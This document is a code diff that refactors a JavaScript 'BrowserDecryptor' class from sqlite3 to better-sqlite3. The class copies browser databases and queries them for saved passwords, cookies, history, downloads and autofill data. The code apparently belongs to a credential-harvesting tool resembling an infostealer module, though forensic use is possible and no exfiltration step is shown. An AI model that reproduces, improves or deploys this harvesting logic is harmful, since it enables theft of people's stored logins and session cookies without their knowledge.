@@ -5,7 +5,7 @@
 
 const fs = require('fs');
 const path = require('path');
-const sqlite3 = require('sqlite3').verbose();
+const Database = require('better-sqlite3');
 const { logger } = require('../../core/logger');
 const { ErrorHandler, ModuleError } = require('../../core/errors');
 
@@ -86,51 +86,34 @@ class BrowserDecryptor {
             return await this.parseBookmarksFile(filePath);
         }
 
-        return new Promise((resolve, reject) => {
-            // Copy file to temp location for reading (browsers may have it locked)
-            const tempFile = filePath + '.temp';
+        // Copy file to temp location for reading (browsers may have it locked)
+        const tempFile = filePath + '.temp';
+        try {
+            fs.copyFileSync(filePath, tempFile);
+        } catch (error) {
+            logger.debug(`Could not copy database file: ${error.message}`);
+            return [];
+        }
+
+        try {
+            const db = new Database(tempFile, { readonly: true, fileMustExist: true });
+            const data = this.queryDatabase(db, dataType, browserType);
+            db.close();
+            
+            // Clean up temp file
             try {
-                fs.copyFileSync(filePath, tempFile);
-            } catch (error) {
-                logger.debug(`Could not copy database file: ${error.message}`);
-                resolve([]);
-                return;
-            }
-
-            const db = new sqlite3.Database(tempFile, sqlite3.OPEN_READONLY, (err) => {
-                if (err) {
-                    logger.debug(`Could not open database: ${err.message}`);
-                    // Clean up temp file
-                    try {
-                        fs.unlinkSync(tempFile);
-                    } catch (e) {}
-                    resolve([]);
-                    return;
-                }
-
-                this.queryDatabase(db, dataType, browserType)
-                    .then(data => {
-                        db.close((err) => {
-                            if (err) {
-                                logger.debug(`Error closing database: ${err.message}`);
-                            }
-                            // Clean up temp file
-                            try {
-                                fs.unlinkSync(tempFile);
-                            } catch (e) {}
-                            resolve(data);
-                        });
-                    })
-                    .catch(error => {
-                        db.close();
-                        try {
-                            fs.unlinkSync(tempFile);
-                        } catch (e) {}
-                        logger.debug(`Database query failed: ${error.message}`);
-                        resolve([]);
-                    });
-            });
-        });
+                fs.unlinkSync(tempFile);
+            } catch (e) {}
+            
+            return data;
+        } catch (error) {
+            logger.debug(`Could not open database: ${error.message}`);
+            // Clean up temp file
+            try {
+                fs.unlinkSync(tempFile);
+            } catch (e) {}
+            return [];
+        }
     }
 
     /**
@@ -138,67 +121,64 @@ class BrowserDecryptor {
      * @param {Object} db - SQLite database connection
      * @param {string} dataType - Type of data to query
      * @param {string} browserType - Browser type
-     * @returns {Promise<Array>} Query results
+     * @returns {Array} Query results
      */
-    async queryDatabase(db, dataType, browserType) {
-        return new Promise((resolve, reject) => {
-            let query = '';
-            let processor = null;
+    queryDatabase(db, dataType, browserType) {
+        let query = '';
+        let processor = null;
 
-            switch (dataType) {
-                case 'passwords':
-                    query = `SELECT origin_url, username_value, password_value, date_created 
-                            FROM logins 
-                            WHERE blacklisted_by_user = 0 
-                            ORDER BY date_created DESC`;
-                    processor = this.processPasswordRow.bind(this);
-                    break;
+        switch (dataType) {
+            case 'passwords':
+                query = `SELECT origin_url, username_value, password_value, date_created 
+                        FROM logins 
+                        WHERE blacklisted_by_user = 0 
+                        ORDER BY date_created DESC`;
+                processor = this.processPasswordRow.bind(this);
+                break;
 
-                case 'cookies':
-                    query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
-                            FROM cookies 
-                            ORDER BY creation_utc DESC 
-                            LIMIT 1000`;
-                    processor = this.processCookieRow.bind(this);
-                    break;
+            case 'cookies':
+                query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
+                        FROM cookies 
+                        ORDER BY creation_utc DESC 
+                        LIMIT 1000`;
+                processor = this.processCookieRow.bind(this);
+                break;
 
-                case 'history':
-                    query = `SELECT url, title, visit_count, last_visit_time 
-                            FROM urls 
-                            WHERE visit_count > 0 
-                            ORDER BY last_visit_time DESC 
-                            LIMIT 1000`;
-                    processor = this.processHistoryRow.bind(this);
-                    break;
+            case 'history':
+                query = `SELECT url, title, visit_count, last_visit_time 
+                        FROM urls 
+                        WHERE visit_count > 0 
+                        ORDER BY last_visit_time DESC 
+                        LIMIT 1000`;
+                processor = this.processHistoryRow.bind(this);
+                break;
 
-                case 'downloads':
-                    query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
-                            FROM downloads 
-                            ORDER BY start_time DESC 
-                            LIMIT 500`;
-                    processor = this.processDownloadRow.bind(this);
-                    break;
+            case 'downloads':
+                query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
+                        FROM downloads 
+                        ORDER BY start_time DESC 
+                        LIMIT 500`;
+                processor = this.processDownloadRow.bind(this);
+                break;
 
-                case 'autofill':
-                    query = `SELECT name, value, count, date_created 
-                            FROM autofill 
-                            ORDER BY count DESC, date_created DESC 
-                            LIMIT 500`;
-                    processor = this.processAutofillRow.bind(this);
-                    break;
+            case 'autofill':
+                query = `SELECT name, value, count, date_created 
+                        FROM autofill 
+                        ORDER BY count DESC, date_created DESC 
+                        LIMIT 500`;
+                processor = this.processAutofillRow.bind(this);
+                break;
 
-                default:
-                    resolve([]);
-                    return;
-            }
+            default:
+                return [];
+        }
 
+        try {
+            const stmt = db.prepare(query);
+            const rows = stmt.all();
             const results = [];
-            db.each(query, (err, row) => {
-                if (err) {
-                    logger.debug(`Query error: ${err.message}`);
-                    return;
-                }
 
+            for (const row of rows) {
                 try {
                     const processedRow = processor ? processor(row, browserType) : row;
                     if (processedRow) {
@@ -207,14 +187,13 @@ class BrowserDecryptor {
                 } catch (error) {
                     logger.debug(`Row processing error: ${error.message}`);
                 }
-            }, (err, count) => {
-                if (err) {
-                    reject(err);
-                } else {
-                    resolve(results);
-                }
-            });
-        });
+            }
+
+            return results;
+        } catch (error) {
+            logger.debug(`Query error: ${error.message}`);
+            return [];
+        }
     }
 
     /**
